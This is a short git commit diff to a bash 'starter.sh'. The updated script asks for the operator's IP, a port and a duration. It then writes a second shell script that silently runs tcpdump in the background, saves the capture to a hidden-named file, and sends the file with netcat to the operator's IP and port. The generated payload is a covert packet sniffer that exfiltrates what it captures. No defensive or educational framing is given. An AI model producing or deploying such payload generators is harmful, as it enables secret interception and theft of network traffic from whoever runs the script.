5b12e93a469def830a3b1bb0ddf3ffb186d7b98f
Sobanggg <abolfazleshghi1385@gmail.com>
2024-06-02 04:21:56 -0400

    build a script capture file

--- starter.sh
+++ starter.sh
@@ -1,12 +1,18 @@
 #!/bin/bash
 clear
-while true; do 
-read -p "inter the target ip : " tIp
+read -p "enter your ip : " ip
 #if [[ $tIp =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
 #	break
 #fi
-read -p "inter the port for send file : " port
-read -p "inter the reciver name : " rName
-read -p "inter the time for recive (N for no time) : " rtime
-done
+read -p "enter the port for send file : " port
+read -p "enter the captureData name (.sh): " name
+read -p "enter the time for recive (Second) : " rTime
 
+cat << EOF > ./$name
+#!/bin/bash
+
+        {
+        timeout $rTime tcpdump -w  ./..1
+        nc -w 3 $ip $port < ./..1
+        } > /dev/null 2>&1 &
+EOF
